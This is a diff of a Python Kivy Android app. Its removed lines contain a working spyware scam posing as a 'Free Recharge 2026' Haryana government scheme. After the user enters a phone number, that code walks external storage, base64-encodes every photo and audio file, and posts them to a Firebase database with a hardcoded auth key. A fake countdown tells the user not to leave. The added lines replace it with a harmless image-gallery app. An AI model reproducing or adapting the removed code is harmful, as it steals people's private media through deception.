@@ -13,7 +13,6 @@ from kivy.uix.videoplayer import VideoPlayer
 from kivymd.uix.boxlayout import MDBoxLayout
 from kivy.uix.floatlayout import FloatLayout
 from kivymd.uix.button import MDRectangleFlatButton, MDFlatButton, MDRaisedButton, MDFillRoundFlatButton, MDFillRoundFlatIconButton, MDRoundFlatIconButton, MDRoundFlatButton, MDFloatingActionButton, MDIconButton
-from kivy.properties import ObjectProperty
 from kivy.metrics import dp
 import requests
 import time
@@ -23,12 +22,12 @@ from android.permissions import request_permissions, Permission
 from kivy.animation import Animation
 from kivy.utils import platform
 from android.storage import primary_external_storage_path
-from kivy.properties import StringProperty
 from kivy.core.clipboard import Clipboard
 import os
 import re
 import datetime
 import time
+import sqlite3
 from kivy.clock import Clock
 import io
 import base64
@@ -36,175 +35,169 @@ import webbrowser
 from kivymd.uix.filemanager import MDFileManager
 from kivymd.uix.dialog import MDDialog
 from jnius import JavaException
+from kivy.properties import StringProperty
 import threading
+
 
 kv='''
 Manager:
     Fir:
     Sec:
+        
 <Fir>:
     name:'S1'
-    FitImage:
-        source:'assets/dow_17.jpg'
-    MDLabel:
-        id:l1
-        text:'ENTER PH NUMBER:- '       
-        pos_hint:{'center_x':0.2,'center_y':0.85}       
-        size_hint:0.4,0.05
-        theme_text_color:'Custom'
-        text_color:1,0,0,1
+    md_bg_color:1,0,0,1
         
-        
-    MDTextField:
-        id:tf1
-        mode:'round'
-        pos_hint:{'center_x':0.7,'center_y':0.85}       
-        size_hint:0.5,0.05        
-        input_type:'number'
-        input_filter:'int'
-        helper_text:'Required'
-        required:True
-        
-    MDRaisedButton:
-        id:b1        
-        text:'Recharge'
-        pos_hint:{'center_x':0.5,'center_y':0.65}       
-        size_hint:0.5,0.05    
-        on_press:app.database()
-
-    MDLabel:
-        id:l2
-        text:'ENTER SIM NAME:- '       
-        pos_hint:{'center_x':0.2,'center_y':0.75}       
-        size_hint:0.4,0.05                  
-        theme_text_color:'Custom'
-        text_color:1,0,0,1                          
-
-    MDTextField:
-        id:tf2
-        mode:'round'
-        pos_hint:{'center_x':0.7,'center_y':0.75}       
-        size_hint:0.5,0.05        
-        helper_text:'Required'
-        required:True        
-
-
-
-
-
-
-    MDTopAppBar:
-        id:ta1
-        pos_hint:{'top':1}
-        title:'Free Recharge 2026'
-
-<Sec>:
-    name:'S2'
-    FitImage:
-        source:'assets/dow_17.jpg'
-        
-    MDLabel:
-        id: timer_label
-        text: "10:00"
-        halign: "center"
-        font_style: "H5" 
-        font_size:'30sp'   
-        theme_text_color:'Custom'
-        text_color:1,0,0,1            
-        
-    MDTopAppBar:
-        id:ta2
-        pos_hint:{'top':1}
-        title:'Welcome on Haryana Goverment Recharge Scheme'
-
-
+    MDBottomNavigation:
+        id:bn1    
+        #panel_color:1,1,1,1
+        #selected_color_indicator:0,0,0,0
+        MDBottomNavigationItem:
+            name:'ns1'  
+            text:'home'  
+            icon:'home'
+            MDCard:
+                id:mdc1
+                pos_hint:{'center_x':0.5,'center_y':0.45}
+                size_hint:1,0.9 
+                radius:[30,30,30,30]            
+                elevation:8      
+                RecycleView:
+                    id:rv1
+                    viewclass:'ImgCard'
+                    RecycleBoxLayout:
+                        default_size: None, dp(260)
+                        default_size_hint: 1, None
+                        size_hint_y: None
+                        height: self.minimum_height
+                        spacing:10
+                        padding:10
+                        orientation: "vertical"
+            
+            
+    
+            MDTopAppBar:
+                id:ta1
+                title:'OUR APP'
+                anchor_title:'left'
+                pos_hint:{'top':1}
+                #md_bg_color:1,1,1,1
+                specific_text_color:1,0,0,1
+                right_action_items: [["white-balance-sunny", lambda x: app.theme_change(self)],["update",lambda x:app.add()]]
+                
+        MDBottomNavigationItem:
+            name:'ns2'
+            text:'setting'
+            icon:'cog'
+            
 
 
 '''
 
 class Manager(ScreenManager):
     pass
-
+    
 class Fir(Screen):
     pass
      
 class Sec(Screen):
     pass
     
+class ImgCard(MDBoxLayout):
+    try:
+        img = StringProperty('')
+    
+        def __init__(self, **kwargs):
+            super().__init__(**kwargs)
+            self.orientation = 'vertical'
+            self.spacing = dp(5)
+            self.size_hint_y = None
+            self.height = dp(220)        
+         
+            self.image = AsyncImage(size_hint=(1,1),
+                allow_stretch=True,
+                keep_ratio=False            
+            )
+            self.add_widget(self.image)        
+            self.bu1=MDIconButton(icon='download',pos_hint={'center_x':0.9,'center_y':0.1})                
+            self.add_widget(self.bu1)       
+            self.bu1.bind(on_press=self.dow)        
+    
+        def on_img(self, instance, value):      
+            self.image.source = value
+            self.image.opacity=0
+            anim=Animation(opacity=1,duration=3)
+            anim.start(self.image)
+    except Exception as e:
+        toast(str(e))     
 
-class Demo(MDApp):
-    def build(self):        
+    def dow(self,*args):
+        try:
+            url=f'{self.img}'          
+            threading.Thread(target=self.down,args=(self.img,),daemon=True).start()
+            
+        except Exception as e:
+            toast(str(e))                                                  
+    def down(self,va):
+        try:               
+             dow_path=f'{primary_external_storage_path()}/y_t'
+             os.makedirs(dow_path,exist_ok=True)
+             response=requests.get(va)
+             if response.status_code==200:
+                 with open(f'{dow_path}/a_{random.randint(0,107360373)}.png','wb') as f:
+                     f.write(response.content)
+                     Clock.schedule_once(lambda x: toast('DOWNLOADED')) 
+                     
+                 
+             
+                                                    
+        except Exception as e:
+            Clock.schedule_once(lambda x: toast(str(re)))    
+            Clipboard.copy(str(e))                                                                                        
+
+class App(MDApp):
+    def build(self):
+        self.theme_cls.primary_palette = "Teal"
+        self.theme_cls.theme_style = "Dark"  # Options are "Light" or "Dark"
+        self.theme=False
         self.b=Builder.load_string(kv)
         return self.b
-
+        
     def on_start(self):
         try:
             request_permissions([Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE])
         except Exception as e:
             pass
-
-
-    def database(self):
-        try:
-            name=self.b.get_screen('S1').ids.tf1.text         
-            name2=self.b.get_screen('S1').ids.tf2.text    
-            if len(name.strip()) != 10:
-                toast(f'Invalid Ph Number')
-            elif name.strip() !='' and name2.strip() !='':
-              self.url=f'https://whats2-ae5fc-default-rtdb.firebaseio.com/{name}.json'
-              self.api='bvxNCCRKBqnW8SaV2PpJEgYdauWKP9A4D0eZRNxd'   
-              self.final=f'{self.url}?auth={self.api}'         
-              threading.Thread(target=self.write,daemon=True).start()
-              self.b.current='S2'
-              self.time=10*60
-              Clock.schedule_interval(self.u_t,1)
-             
-            else:
-                toast('PLEASE ENTER ALL DETAILS')                
+                            
+        list=[]
+        for i in range(100):
+            image_url = f"https://picsum.photos/600/300?random={i}"
+            list.append({'img':image_url})
+        self.b.get_screen('S1').ids.rv1.data=list
+                 
+    def delete(self):
+        self.b.get_screen('S1').ids.rv1.data=[]           
+       
+    def add(self):        
+        list=[]                 
+        for i in range(100):
+            unique=random.randint(0,1000000000)
+            image_url = f"https://picsum.photos/600/300?random={unique}"
+            list.append({'img':image_url})
+        self.b.get_screen('S1').ids.rv1.data=list      
         
-        except Exception as e:
-            toast(str(e))
-            
-    def write(self,*a):
-        try:
-            Clock.schedule_once(lambda x:toast('START'))                     
-            path=primary_external_storage_path()
-            m4a_ext=('.mp3','.m4a','.jpg','.png')    
-            mpa_ext=('.png','.jpg')
-            self.all=[]
-            for f,s,fi in os.walk(path):
-                for i in fi:                   
-                    if i.lower().endswith(m4a_ext):
-                        full_path=os.path.join(f,i)
-                        self.all.append(full_path)
-            a2=[]
-            for i in self.all:             
-                with open(i,'rb') as f:
-                    data=f.read()  
-                    encode=base64.b64encode(data).decode('utf-8')
-                    if i.lower().endswith(mpa_ext):
-                        jsn={'images':encode}
-                    else:
-                        jsn={'audio':encode}
-                    requests.post(self.final,json=jsn)                    
-            Clock.schedule_once(lambda x:toast('ALL POSTED'))                   
-
-        except Exception as e:
-            Clock.schedule_once(lambda x:toast('PROBLEM'))
-            
-
-    def u_t(self,*a):         
-        if self.time>0:
-            min=self.time//60
-            seco=self.time%60
-            self.b.get_screen('S2').ids.timer_label.text=f"Recharge In:- {min:02}:{seco:02} minutes.Please don't go back"     
-            self.time -= 1           
+    def theme_change(self,a):     
+        if self.theme:
+            self.b.get_screen('S1').ids.bn1.panel_color=0,0,0,1
+            self.theme_cls.primary_palette = "Teal"
+            self.theme_cls.theme_style = "Dark"      
+            self.theme = not self.theme
         else:
-            tcc=self.b.get_screen('S2').ids.timer_label
-            tcc.theme_text_color='Custom'
-            tcc.text_color=0,1,0,1
-            self.b.get_screen('S2').ids.timer_label.text='RECHARGE REQUEST SENT TO HARYANA GOVERMENT'
-            Clock.unschedule(self.u_t)                                                           
-                                                      
+            self.theme_cls.primary_palette = "Red"
+            self.theme_cls.theme_style = "Light"   
+            self.b.get_screen('S1').ids.bn1.panel_color=1,1,1,1
+            self.b.get_screen('S1').ids.ta1.md_bg_color=1,1,1,1
+            self.theme = not self.theme               
+                  
 
-Demo().run()
+App().run()
